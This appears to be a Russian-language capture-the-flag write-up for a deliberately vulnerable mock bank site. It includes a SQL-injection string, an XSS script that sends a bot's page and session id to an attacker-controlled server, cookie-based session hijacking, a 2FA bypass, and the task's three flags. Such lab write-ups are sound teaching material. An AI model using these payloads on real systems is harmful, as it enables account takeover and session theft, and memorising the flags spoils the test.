# web-ebanking


## Условие
Перед вами сайт ЛКЛ-Банка. Над ним работали лучшие программисты и специалисты
по безопасности, так что, вне всякого сомнения, он сделан надёжно и безопасно.

Или нет?

https://здесь.будет.сайт


## Решение
**Шаг 0. Получение исходников**. DirBuster находит путь `/info`, по которому доступны полные исходники сайта

**Шаг 1. SQL-инъекция**. В форме получения сведений о пользователе есть SQL-инъекция. Инъектируем в поле ввода
имени пользователя что-то вроде `" OR username = "user1` и получаем хэш пароля пользователя `user1`, а также узнаём,
что 2FA у него отключена. Аналогично, то же самое делаем для пользователей `smart_bot` и `admin` (у admin'а 2FA включена).
Хэш подбирается только `user1`, и его пароль — `simplicity`. В его личном кабинете получаем первый флаг

**Шаг 2. XSS**. Вбиваем в личном кабинете в строку поиска что-либо: видим, что HTML-код "проверяется smart_bot'ом".
Смотрим исходники — smart_bot тупо загружает полученный им html-код в браузер, подставляя туда также свой id сессии.
Но в html-коде, который вставляется браузер, присутствует и запрос в строке поиска без эскейпинга. Проводим XSS:
вставляем это в строку поиска:

```html
<script>
setTimeout(
    function() {
        let x = new XMLHttpRequest();
        x.open(
            'GET',
            `https://<some_local_http_server>/${encodeURIComponent(document.documentElement.innerHTML)}`,
            true
        );
        x.send();
    },
    1000
)
</script>
```

где `<some_local_http_server>` — это любой подконтрольный вам доступный извне сервер, логгирующий запросы.
Например, можно использовать локальный HTTP-сервер и localtunnel с ключом `--print-requests`. В реквесте к
этому серверу будет закодирован отображаемый документ полностью, включая id сессии smart_bot'а. Подставляем его в куки
и "входим" как smart_bot. В личном кабинете нас ждёт второй флаг и пароль админа

***FIXME:*** если какой-то из игроков разлогинится за smart_bot, то для остальных таск станет нерешаемым

**Шаг 3. Взлом 2FA**. У админа настроен 2FA, так что просто пароля не хватит. Однако если внимательно изучить главную
страницу, можно найти комментарий:
`<!-- static/image-512df359789cee50e97f40d25272c0b84d94459bc8631ce32132a5942f022d77.png -->`

Подставляем URL — видим QR-код. Сканируем — что-то, связанное с `totp`. Значит, это ключ для 2FA. Берём любой
TOTP-клиент (Google Authenticator, Authy, Aegis, etc.), сканируем QR-код, получаем доступ к 2FA. Заходим и видим третий
и последний флаг.


## Флаги
- `LKLCTF{1_of_3__beb19c847ea31f34d62cbbcb7c16dd52}`
- `LKLCTF{2_of_3__eeb328263989e16eb39bf80ed6de790c}`
- `LKLCTF{3_of_3__436410a01b9f7ac7682b278aa9963731}`


## TODO
- Написать более подробное решение
